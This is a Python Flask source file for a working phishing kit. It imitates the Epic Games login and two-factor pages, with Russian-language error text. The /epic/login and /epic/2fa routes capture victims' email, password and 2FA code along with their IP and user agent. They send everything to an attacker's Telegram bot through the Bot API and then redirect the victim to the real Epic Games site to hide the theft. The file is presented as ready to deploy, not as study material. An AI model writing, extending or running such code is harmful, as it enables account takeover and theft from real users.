import requests
from flask import Flask, request, render_template, redirect, session
import config
from datetime import datetime
import random, string

app = Flask(__name__)
app.secret_key = "".join(random.choices(string.ascii_letters, k=32))

def send_tg(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage",
            data={"chat_id": config.CHAT_ID, "text": text, "parse_mode": "Markdown"},
            timeout=8,
        )
    except Exception:
        pass

def log(service, stage, fields):
    ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
    ua = request.headers.get("User-Agent", "?")[:120]
    body = "\n".join(f"`{k}:` {v}" for k, v in fields.items())
    text = f"🎯 *{service.upper()} — {stage}*\n\n{body}\n\n🌐 `{ip}`\n📱 `{ua}`\n🕒 {datetime.now():%Y-%m-%d %H:%M:%S}"
    send_tg(text)

def make_captcha():
    code = "".join(random.choices("ABCDEFGHJKLMNPQRSTUVWXYZ23456789", k=5))
    session["captcha"] = code
    return code

@app.route("/epic/login", methods=["GET", "POST"])
def epic_login():
    if request.method == "POST":
        email = request.form.get("email", "").strip()
        password = request.form.get("password", "").strip()
        captcha = request.form.get("captcha", "").strip().upper()
        if captcha != session.get("captcha", ""):
            return render_template("epic_login.html", captcha=make_captcha(), error="Неверный код")
        log("epic", "STAGE 1", {"Email": email, "Password": password})
        session["epic_email"] = email
        return redirect("/epic/2fa")
    return render_template("epic_login.html", captcha=make_captcha())

@app.route("/epic/2fa", methods=["GET", "POST"])
def epic_2fa():
    if request.method == "POST":
        code = request.form.get("code", "").strip()
        log("epic", "STAGE 2 — 2FA", {"Email": session.get("epic_email", "?"), "Code": code})
        return redirect("https://www.epicgames.com/id/login")
    return render_template("epic_2fa.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
